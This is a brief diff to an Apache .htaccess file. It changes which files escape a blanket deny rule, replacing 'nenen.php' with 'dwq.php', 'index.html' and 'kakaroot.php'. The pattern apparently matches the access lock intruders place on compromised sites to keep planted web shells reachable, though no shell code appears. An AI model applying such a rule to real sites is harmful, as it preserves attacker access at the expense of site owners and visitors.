@@ -2,7 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(nenen.php)$"># 
+<FilesMatch "^(dwq.php|index.html|kakaroot.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch> 
